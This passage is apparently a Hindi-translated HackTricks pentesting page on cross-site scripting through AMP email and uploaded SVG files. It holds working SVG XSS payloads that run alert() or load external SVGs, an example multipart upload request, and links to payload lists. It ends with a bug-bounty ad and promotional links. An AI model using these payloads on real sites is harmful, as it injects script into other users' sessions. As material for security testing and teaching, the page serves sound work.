AMP एक तकनीक है जिसे मोबाइल क्लाइंट पर सुपर तेज़ वेब पृष्ठ विकसित करने के लिए जाना जाता है। **AMP एक HTML टैग सेट है जिसे जावास्क्रिप्ट समर्थित करता है** जो प्रदर्शन और सुरक्षा पर ध्यान केंद्रित करके आसानी से कार्यक्षमता को सक्षम करता है। [AMP के घटक](https://amp.dev/documentation/components/?format=websites) हर चीज़ के लिए हैं, जैसे कैरोसेल, प्रतिक्रियाशील फ़ॉर्म तत्व, दूरस्थ संबंधित अंतबिंदु से ताजगी प्राप्त करने के लिए।

[**AMP ईमेल के लिए**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) प्रारूप ईमेल संदेशों में उपयोग करने के लिए [AMP घटकों का एक उपसंग](https://github.com/ampproject/amphtml/blob/master/docs/spec/email/amp-email-components.md) प्रदान करता है जिसे आप ईमेल में सीधे देख सकते हैं और उनके साथ इंटरैक्ट कर सकते हैं।

उदाहरण [**Amp4Email में XSS का लेख**](https://adico.me/post/xss-in-gmail-s-amp4email).

### फ़ाइलें अपलोड करते समय XSS (svg)

निम्नलिखित फ़ाइल के रूप में एक छवि के रूप में एक फ़ाइल अपलोड करें (स्रोत: [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```markup
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
अधिक **SVG payloads** के लिए [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) पर जाएं।

## मिस्क जेएस ट्रिक्स और संबंधित जानकारी

{% content-ref url="other-js-tricks.md" %}
[other-js-tricks.md](other-js-tricks.md)
{% endcontent-ref %}

## XSS संसाधन

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
* [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
* [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)

### XSS टूल्स

[**यहां XSS के लिए कुछ टूल्स**](xss-tools.md) **देखें।**

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**बग बाउंटी टिप**: **Intigriti** में **साइन अप करें**, एक प्रीमियम **बग बाउंटी प्लेटफॉर्म जो हैकर्स द्वारा बनाई गई है**! आज ही [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) पर शामिल हों और **$100,000** तक के बाउंटी कमाना शुरू करें!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी में काम करते हैं**? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित करना चाहते हैं**? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को पीडीएफ में डाउनलोड करने का उपयोग करने का अधिकार** चाहिए? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**।
* **अपने हैकिंग ट्रिक्स साझा करें,** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके**।

</details>
